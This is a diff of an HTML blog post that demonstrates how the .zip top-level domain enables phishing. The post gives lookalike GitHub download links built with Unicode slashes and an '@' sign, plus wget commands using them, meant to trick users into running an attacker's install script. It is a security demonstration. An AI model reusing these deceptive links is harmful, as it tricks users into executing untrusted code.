@@ -4,7 +4,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
 <meta name=robots content="index, follow">
 <title>Demo of 20230609.zip | wes4m</title>
-<meta name=keywords content="first">
+<meta name=keywords content>
 <meta name=description content="Shows how google new .zip TLD can be abused.">
 <meta name=author content="wes4m">
 <link rel=canonical href=https://wes4m.io/posts/demo-of-20230609/>
@@ -29,21 +29,24 @@
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://wes4m.io/posts/demo-of-20230609/">
 <meta property="og:image" content="https://wes4m.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2023-05-18T23:02:53+03:00">
-<meta property="article:modified_time" content="2023-05-18T23:02:53+03:00"><meta property="og:site_name" content="wes4m">
+<meta property="article:published_time" content="2018-01-18T23:02:53+03:00">
+<meta property="article:modified_time" content="2018-01-18T23:02:53+03:00"><meta property="og:site_name" content="wes4m">
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://wes4m.io/%3Cimage%20path/url%3E">
 <meta name=twitter:title content="Demo of 20230609.zip">
 <meta name=twitter:description content="Shows how google new .zip TLD can be abused.">
 <script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wes4m.io/posts/"},{"@type":"ListItem","position":2,"name":"Demo of 20230609.zip","item":"https://wes4m.io/posts/demo-of-20230609/"}]}</script>
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Demo of 20230609.zip","name":"Demo of 20230609.zip","description":"Shows how google new .zip TLD can be abused.","keywords":["first"],"articleBody":"Google launched 8 new TLDs on May 3rd, 2023 for EAP including .zip (Link) The security community had fun coming with all kinds of phishing ideas using it.\nI made a tool that demonstrated some of this https://20230609.zip. More details and explinations are found in its homepage. The following is just one example of what can be done.\nGithub repos Many github repos include scripts such as build.sh docker-build.sh install.sh …\nIf someone can be fooled into downloading a repo thinking it’s something they’re intending to download, but instead getting something else, then executing any of these or not. Can be very dangerous.\nLet’s take for example this very popular (76k stars) repo for stable-diffusion AUTOMATIC1111/stable-diffusion-webui \nIt contains a file named webui.sh, and the official readme suggests the following to install it\nAutomatic Installation on Linux  Install the dependencies:  # Debian-based: sudo apt install wget git python3 python3-venv # Red Hat-based: sudo dnf install wget git python3 # Arch-based: sudo pacman -S wget git python3 Navigate to the directory you would like the webui to be installed and execute the following command:  bash Just to be clear, there is nothing wrong with any of this. You should always verify what you’re executing. However, for a popular open-source project most peope will just copy-paste and run commands, and trying to read every line of code in a project is not feasible. So just trusting the open source community is easier and a very reasonable path to take for a well known project. However, with some trickery you can use this trust, copy-pasting, and google’s new .zip TLD to cause some trouble.\nI created a demo repo here that contains some harmless bash scripts wes4m/20230609-demo  including a webui.sh that echos a message when executed. Using this and the link of an automatic111 webui’s release\nhttps://github.com/AUTOMATIC1111/stable-diffusion-webui/archive/refs/tags/v1.2.1.zip in 20230609.zip to generate the following\nhttp://github.com∕automatic1111∕stable-diffusion-webui∕archive∕refs∕tags∕@v1.2.1.20230609.zip Which looks fairly normal for someone just quickly exeucting commands. It can be used in the browser or through any other tool such as\nwget -qO v1.2.1.zip http://github.com∕automatic1111∕stable-diffusion-webui∕archive∕refs∕tags∕@v1.2.1.20230609.zip Or using the space trick\nwget -qO v1.2.1.20230609.zip https://github.com/automatic1111/stable-diffusion-webui/archive/refs/tags/ v1.2.1.20230609.zip For explanations check 20230609.zip.\nNow I can use this link to convince someone, or post it somewhere as an answer maybe, as a way to download the project, or and older more stable version of it? to get the victim to execute my own file.\n Of course the name of the repo is obvious in this one, as I didn’t bother making it more convincing, but you get the idea.\nMore tricks? if you have more tricks please let me know so I can add them to page. Thanks ❤️\n","wordCount":"441","inLanguage":"en","image":"https://wes4m.io/%3Cimage%20path/url%3E","datePublished":"2023-05-18T23:02:53+03:00","dateModified":"2023-05-18T23:02:53+03:00","author":{"@type":"Person","name":"wes4m"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wes4m.io/posts/demo-of-20230609/"},"publisher":{"@type":"Organization","name":"wes4m","logo":{"@type":"ImageObject","url":"https://wes4m.io/favicon.ico"}}}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Demo of 20230609.zip","name":"Demo of 20230609.zip","description":"Shows how google new .zip TLD can be abused.","keywords":[],"articleBody":"Google launched 8 new TLDs on May 3rd, 2023 for EAP including .zip (Link) The security community had fun coming with all kinds of phishing ideas using it.\nI made a tool that demonstrated some of this https://20230609.zip. More details and explinations are found in its homepage. The following is just one example of what can be done.\nGithub repos Many github repos include scripts such as build.sh docker-build.sh install.sh …\nIf someone can be fooled into downloading a repo thinking it’s something they’re intending to download, but instead getting something else, then executing any of these or not. Can be very dangerous.\nLet’s take for example this very popular (76k stars) repo for stable-diffusion AUTOMATIC1111/stable-diffusion-webui \nIt contains a file named webui.sh, and the official readme suggests the following to install it\nAutomatic Installation on Linux  Install the dependencies:  # Debian-based: sudo apt install wget git python3 python3-venv # Red Hat-based: sudo dnf install wget git python3 # Arch-based: sudo pacman -S wget git python3 Navigate to the directory you would like the webui to be installed and execute the following command:  bash Just to be clear, there is nothing wrong with any of this. You should always verify what you’re executing. However, for a popular open-source project most peope will just copy-paste and run commands, and trying to read every line of code in a project is not feasible. So just trusting the open source community is easier and a very reasonable path to take for a well known project. However, with some trickery you can use this trust, copy-pasting, and google’s new .zip TLD to cause some trouble.\nI created a demo repo here that contains some harmless bash scripts wes4m/20230609-demo  including a webui.sh that echos a message when executed. Using this and the link of an automatic111 webui’s release\nhttps://github.com/AUTOMATIC1111/stable-diffusion-webui/archive/refs/tags/v1.2.1.zip in 20230609.zip to generate the following\nhttp://github.com∕automatic1111∕stable-diffusion-webui∕archive∕refs∕tags∕@v1.2.1.20230609.zip Which looks fairly normal for someone just quickly exeucting commands. It can be used in the browser or through any other tool such as\nwget -qO v1.2.1.zip http://github.com∕automatic1111∕stable-diffusion-webui∕archive∕refs∕tags∕@v1.2.1.20230609.zip Or using the space trick\nwget -qO v1.2.1.20230609.zip https://github.com/automatic1111/stable-diffusion-webui/archive/refs/tags/ v1.2.1.20230609.zip For explanations check 20230609.zip.\nNow I can use this link to convince someone, or post it somewhere as an answer maybe, as a way to download the project, or and older more stable version of it? to get the victim to execute my own file.\n Of course the name of the repo is obvious in this one, as I didn’t bother making it more convincing, but you get the idea.\nMore tricks? if you have more tricks please let me know so I can add them to page. Thanks ❤️\n","wordCount":"441","inLanguage":"en","image":"https://wes4m.io/%3Cimage%20path/url%3E","datePublished":"2018-01-18T23:02:53+03:00","dateModified":"2018-01-18T23:02:53+03:00","author":{"@type":"Person","name":"wes4m"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wes4m.io/posts/demo-of-20230609/"},"publisher":{"@type":"Organization","name":"wes4m","logo":{"@type":"ImageObject","url":"https://wes4m.io/favicon.ico"}}}</script>
 </head>
-<body class=dark id=top>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add('dark')</script>
 <header class=header>
 <nav class=nav>
 <div class=logo>
 <a href=https://wes4m.io/ accesskey=h title="./ (Alt + H)">./</a>
 <div class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
 </div>
 </div>
 <ul id=menu>
@@ -65,7 +68,7 @@ Demo of 20230609.zip
 <div class=post-description dir=ltr>
 Shows how google new .zip TLD can be abused.
 </div>
-<div class=post-meta dir=ltr><span title="2023-05-18 23:02:53 +0300 +0300">May 18, 2023</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;wes4m&nbsp;|&nbsp;<a href=https://github.com/wes4m/wes4m.github.io/tree/drafting/content/posts/demo-of-20230609.md rel="noopener noreferrer" target=_blank>Suggest Changes</a>
+<div class=post-meta dir=ltr><span title="2018-01-18 23:02:53 +0300 +0300">January 18, 2018</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;wes4m&nbsp;|&nbsp;<a href=https://github.com/wes4m/wes4m.github.io/tree/drafting/content/posts/demo-of-20230609.md rel="noopener noreferrer" target=_blank>Suggest Changes</a>
 </div>
 </header>
 <div class=post-content dir=ltr><p>Google launched 8 new TLDs on May 3rd, 2023 for EAP including .zip (<a href=https://registry.google/announcements/launch-details-for-eight-new-tlds/>Link</a>)
@@ -108,20 +111,19 @@ sudo pacman -S wget git python3
 </div>
 <footer class=post-footer>
 <ul class=post-tags dir=ltr>
-<li><a href=https://wes4m.io/tags/first/>first</a></li>
 </ul>
 <nav class=paginav>
-<a class=next href=https://wes4m.io/posts/ta-dataflow-programming/>
-<span class=title>Next »</span>
+<a class=prev href=https://wes4m.io/posts/pe_infection/>
+<span class=title>« Prev</span>
 <br>
-<span>Side Project #9837: Visual Nodes Scripting</span>
+<span>آلية عمل | PE Infection</span>
 </a>
 </nav>
 </footer>
 </article>
 </main>
 <footer class=footer>
-<span>&copy; 2023 <a href=https://wes4m.io/>wes4m</a></span>
+<span>&copy; 2025 <a href=https://wes4m.io/>wes4m</a></span>
 <span>
 Powered by
 <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
@@ -132,5 +134,6 @@ Powered by
 </a>
 <script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
 <script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
 </body>
 </html>
